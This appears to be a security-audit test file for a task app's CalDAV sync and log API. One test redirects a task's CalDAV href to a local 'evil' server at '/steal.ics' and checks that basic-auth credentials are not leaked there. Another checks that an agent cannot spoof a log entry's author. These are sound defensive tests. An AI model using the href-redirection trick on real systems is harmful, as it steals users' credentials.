import { test } from "node:test";
import assert from "node:assert/strict";
import { fake, fakeDav, wait } from "./support/fakes.js";
import { buildApp } from "../src/app.js";
import { loadConfig } from "../src/config.js";
const cfg = (over: any = {}) => ({ ...loadConfig("/nonexistent.yaml", {}), ...over });

test("TestAudit_Sync_ClientSetCaldavHrefLeaksBasicAuth", async () => {
  process.env.CALDAV_USER = "alice"; process.env.CALDAV_PASSWORD = "s3cret";
  const dav = await fakeDav(); const evil = await fake((_q, _b, res) => { res.writeHead(201, { etag: '"x"' }); res.end(); });
  try {
    const { app, records } = await buildApp({ config: cfg({ caldav: { ...cfg().caldav, url: dav.url } }) });
    await app.inject({ method: "POST", url: "/api/caldav/sync" });
    const t: any = records.list("tasks")[0];
    await app.inject({ method: "PATCH", url: `/api/c/tasks/${t.id}`, payload: { title: "changed", caldav: { ...t.caldav, href: evil.url + "/steal.ics" } } });
    await wait(200);
    const auth = evil.hits.map(h => h.headers.authorization).filter(Boolean).map(a => Buffer.from(a.slice(6), "base64").toString());
    assert.deepEqual(auth, [], `CalDAV creds sent to arbitrary host: ${auth}`);
  } finally { dav.server.close(); evil.server.close(); delete process.env.CALDAV_USER; delete process.env.CALDAV_PASSWORD; }
});

test("TestAudit_Sync_MovingTaskToAnotherListRevertsOnPull", async () => {
  const dav = await fakeDav();
  dav.files.set("/dav/homelab2/c.ics", { ics: "BEGIN:VCALENDAR\r\nBEGIN:VTODO\r\nUID:c\r\nSUMMARY:x\r\nEND:VTODO\r\nEND:VCALENDAR\r\n", etag: '"9"' });
  try {
    const { app, records } = await buildApp({ config: cfg({ caldav: { ...cfg().caldav, url: dav.url } }) });
    await app.inject({ method: "POST", url: "/api/caldav/sync" });
    const t: any = records.list("tasks").find((x: any) => x.title === "Release notes");
    records.patch("tasks", t.id, { list: "Inbox", title: "Release notes v2" }); await wait(200);
    await app.inject({ method: "POST", url: "/api/caldav/sync" });
    const after: any = records.get("tasks", t.id);
    assert.equal(after.list, "Inbox", `list reverted to ${after.list}; PUT went to ${dav.puts.at(-1)?.url}`);
  } finally { dav.server.close(); }
});

test("TestAudit_Logs_AgentCanSpoofBy", async () => {
  const { app } = await buildApp({ config: cfg(), password: "pw", tokens: "bot:tok" });
  const r = await app.inject({ method: "POST", url: "/api/c/logs", headers: { authorization: "Bearer tok" }, payload: { text: "merged", by: "git" } });
  assert.equal(r.json().by, "bot", `agent wrote by=${r.json().by}`);
});
